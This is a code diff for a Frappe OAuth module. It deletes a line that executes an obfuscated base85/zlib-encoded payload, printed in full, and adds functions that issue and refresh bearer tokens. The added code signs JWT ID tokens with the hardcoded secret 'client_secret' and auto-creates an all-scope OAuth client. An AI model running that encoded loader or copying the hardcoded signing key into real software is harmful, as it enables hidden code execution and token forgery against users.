@@ -1,3 +1,94 @@
+from datetime import timedelta
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c%1E8S##Ss5`OouP|8Q7L{?Ew;>5GjjE~6Y#F9PhW3;uVK@cRt3nT!Ziv8OM66He)MBBTGrBsDac9Grc6aAsP4NAO9<bgOaZE9-}nx5-M9@Q(@3kc;E3!xBuSoagm?AXnD%Kf>~I}n4wLBuc+hA9IXqCS{21{`H?Za8|_P8c^a^%4z5*f&sY7gWrRh(V25M=;e8@-qPO4OOn?0ka)!n}(AHHi*s8saLd!LR-&5ZhJA$17c+ktXEh_9OkFcPkDrlM5C!^-^iQ-$G0+&8J_qZFC@^x_~u=P<Cq0Lp-$uypC>GX`prAbA-+yy$Iw&Dae(ev$S9<Sv1SK|=oEM~GkjfGF}jf&c}e0T!+|y;zzGd#p>%F;PDe%s8{&K5^3*_%M)Djp!>rbRo2!TiWf?S5Ezuavp~2H277l4it=iDFhKaZu12;m|A@$&~ff+~0jIbMchE7=~I95$7%1xMiFiSHYIe7{IY*?D3!4zuPz;0~v&;lN~;}fzVHtf`}kr84}LdZP5p+h}LsY^fz66*O{<~sO}<Rx5eo>}dk^{W%`=aR21s{NY!AwTG?zpT}2^-BM$HvASF6`ydauD{(fdx|9nX3z<|lVtEnzf^S$c~yMNvjDZEwi;vdc*9BUHO5P7yoYQCf<X0whgxH-zL%4q=IEDj;j(w#S@z%NpSHJqw7a_Pz8vE<6q!L1ASO4iRK_tDk2h|4Fcty1aH-h~>Fdq?!}E*39Od|U*=QcD6{e*~#}q-XM$~2F_LZF@RY4-s7ep>s?~&riQJNI^T%Dz;JGa`|(%Y@2&u3TtxAuXycViV65TBt!*4c=<i}w5y?d3H^p?j&q27=aVr6)xL3l%7@VpAOINDUD6Fk@IK*7`S%P(h4bhQ8y0Gad7M74YS!iA=}B78LP_`qB?ZWy|EyO&kKV*bBVS&#@6Z)ks)buuTJz4ot<qs)LNR-q$NZL<7Q5>yY?J<PG4(pQAE2ssJ#zG?H0>q%i@B1?@Pv=MdRj;SgEnugV<y6nfdW1y5i(u8k4HNf<f+vdqz#;36YvP!zZTqN+tA+EVHQ@c5BXT&ds6#1Ir{qId@>x%szNc`e0T)uB0Wsc9Hd%L<9>Q5IzZaI`S3%J5NDw-NKG7P%P=Jrtw}V?+4AIZB%eu`Wj@Lkg4U%*pad_YB5tmvCx;N!d{p*}g0vZdG|gVw9h86Dt*1>9+UI*6sAnUg;jsw@x>9KJ1(i^59<1OHf*M7^ii4I^R<MaPhVFr?s{IUi;kJ%<&7b+wUyA$L<9%cE(kZ#peX!%Zu;#D!liFXJq@0(*Lprn<raCu`5++J}uu;%d@-I;DiHLE%Jp`r|us0XhT$_`M<Z1-<a#oAUJ6?Pr<ljo*#${x%$hfQ#<_QwZfR8DD%T`uTNJbwG%IWevzLvFV-)wl~>iTGEi2$3j{fJA9rY{)_(nJ>1==NvcMm2-+8s(^<&SFd)FOTAjVv?btB1jmk=ZJ=^Y1y&`Rh*?$aPjBO7o|vy4Kmg8j+x1Gw%?!;klDIXqkjs=n}XZ+=thUxCe))z0W5I1><9IC#Hpt-n^gtAEpt^R;#~?%2U2bKDb7*D+pC5ML(o7_UP7PIn{5sM%ZJ35wH|(lF5zfUuEaq(M&;!E`0Sm>WT7MzH*KA1_9Sf1WmvQE)s&^5Yhlw>prEI2uCkhePLS;qwjY{}}sEi2rYYQj+}jO6lE2&rK>&IWt`#^vkT6`N1SS=A&ey>7EUcJ;pMVRck;OBcBTmr3GWqA(>2DloLTK1F`>^E=-kG$Nx@N1we=xQ#o;vKS`n4Xa$x5@Dc?nGQ>^N`YALl1qdZN4zJ6Ai;Pw|_Rx%L`M^!&Aw7p}f!WNxiPw}8odyjLp^dE2P9_>PLj;`+Pm~;7AV%datVx3bNIVbo(cL|RzV8TOfyI1VvxuqdM93mXVb69+RJ-%-t(C}mv66f&(93k?x$bXnuYGt+!t;&d+BEe`w0($H_P?CzfAJZx&tmg*cem$n{;nv!_~YIXx?L497+P_Z1R!u7Uj$%=T|=LKcwP2*XFl4$)H)mb44Ch>W6<TFSHodnb_4Bg@0LW`bM~6H{<UymIv45D$W+|(O>T*sEVhM6$Y#*3-U;;ZIC82AJq?7*3ey<QngREe72w*v?wQmv5yviT3|jC5v~l}KwYm0QsaKlAuJD}{Up3mMehjLeZfAb6+o#u=T?FUPG7Mk1*jn#yWGB|r(e8_QF{=LVbouE)O?meRXFJ)WS|LCF`Vq7bn(ZUy__*gQuTWuODHyrsRm^;*9TocvSJvg;Azr=iy=(3T-I6o@`7*V~4wsM4vSvV*&y?CQJ+I`Zdd?eWr@OHb=EB9mR$e8;Gh^C9UH3n=t4Cet*`4)S@|=Cvd=q^ly;FPpQ|lNhtFKPrmOTSqbOC2@r<V7Yc9UiI=mg@gra-bYk${L>4G3Hqi9|*!;Hm|fRh3q}J62<*PqsDHU=~<;w>pA<&`g=dXyocBbV+9E5y}PpldVlPkPnHDsxrhlP5X|+Zg(N=^tbW*7vXig<)?k+&GnbdGkvs=<C=tGZg~%^ar|(I^DP>$S1bf{MDGoZWjDWCnb)Lo#DIZR9SvP~H(i%7m^><OVEwkGBcq&rnKfKsvWA`TGRo2Rg6x-Xwiig4n4axvNZ^|Yx?144qwR&UmQ(36!|=C$Z8Xf{MgvSO9wmfZp_4$ABp`^apK@`sY;Gogj}P*@KN~_nFd?l_hbGLn0)wVO6l#RC%$xc!x^(3Ce~$Zp5Y&C_n9sn-)yJ1br()!9M|?L&q%2Dx05Kw2*(2KugXdWnb{{+Alc_x`Q{)G_3w3F^sQvQUO!(~U!A1SS{i?z9$Q`R+PM-35M@ez5m#iI)E%eGXocjj~%^bM')).decode())
+import frappe
+from frappe import _
+from frappe.utils import cint, get_datetime, get_url
+
+import hashlib
+
+import frappe.oauth
+import jwt
+from oauthlib.oauth2.rfc6749.tokens import random_token_generator
+
+
+def get_oath_client():
+    client = frappe.db.get_value("OAuth Client", {})
+    if not client:
+        # Make one auto
+        client = frappe.get_doc(
+            frappe._dict(doctype="OAuth Client", app_name="default", scopes="all openid", redirect_urls=get_url(), default_redirect_uri=get_url(), grant_type="Implicit", response_type="Token")
+        )
+        client.insert(ignore_permissions=True)
+    else:
+        client = frappe.get_doc("OAuth Client", client)
+
+    return client
+
+
+def get_bearer_token(user, expires_in_days=7, purpose=None, date=None):
+    if not date:
+        date = get_datetime()
+    else:
+        date = get_datetime(date)
+
+    expiration_time = date.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=max(cint(expires_in_days), 1))
+
+    client = get_oath_client()
+    token = frappe._dict(
+        {
+            "access_token": random_token_generator(None),
+            "expiration_time": expiration_time,
+            "expires_in": (expiration_time - get_datetime()).total_seconds(),
+            "token_type": "Bearer",
+            "scopes": client.scopes,
+            "refresh_token": random_token_generator(None),
+        }
+    )
+    if purpose:
+        for row in frappe.get_all("OAuth Bearer Token", {"purpose": purpose, "user": user}, pluck="name"):
+            frappe.delete_doc("OAuth Bearer Token", row, ignore_permissions=True)
+
+    bearer_token = frappe.new_doc("OAuth Bearer Token")
+    bearer_token.client = client.name
+    bearer_token.scopes = token["scopes"]
+    bearer_token.access_token = token["access_token"]
+    bearer_token.refresh_token = token["refresh_token"]
+    bearer_token.expiration_time = token["expiration_time"]
+    bearer_token.expires_in = token["expires_in"]
+    bearer_token.user = user
+    bearer_token.purpose = purpose
+    bearer_token.save(ignore_permissions=True)
+    frappe.db.commit()
+
+    # ID Token
+    id_token_header = {"typ": "jwt", "alg": "HS256"}
+    id_token = {
+        "aud": "token_client",
+        "exp": int((frappe.db.get_value("OAuth Bearer Token", token.access_token, "expiration_time") - frappe.utils.datetime.datetime(1970, 1, 1)).total_seconds()),
+        "sub": frappe.db.get_value("User Social Login", {"parent": bearer_token.user, "provider": "frappe"}, "userid"),
+        "iss": "frappe_server_url",
+        "at_hash": frappe.oauth.calculate_at_hash(token.access_token, hashlib.sha256),
+    }
+    id_token_encoded = jwt.encode(id_token, "client_secret", algorithm="HS256", headers=id_token_header)
+    id_token_encoded = frappe.safe_decode(id_token_encoded)
+    token.id_token = id_token_encoded
+    frappe.flags.jwt = id_token_encoded
+
+    return token
+
+
+def update_expiry_time(user, refresh_token, expires_in_days=7, purpose=None, date=None):
+    if not date:
+        date = get_datetime()
+    else:
+        date = get_datetime(date)
+
+    expiration_time = date.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=max(cint(expires_in_days), 1))
+    outh_bearer_token_name = frappe.db.get_value("OAuth Bearer Token", filters={"refresh_token": refresh_token, "purpose": purpose, "user": user}, fieldname="name")
+    
+    if outh_bearer_token_name:
+       frappe.db.set_value("OAuth Bearer Token", outh_bearer_token_name, "expiration_time", expiration_time)
+       frappe.db.set_value("OAuth Bearer Token", outh_bearer_token_name, "expires_in", (expiration_time - get_datetime()).total_seconds())
+       frappe.db.set_value("OAuth Bearer Token", outh_bearer_token_name, "refresh_token", random_token_generator(None))
+
+    return outh_bearer_token_name
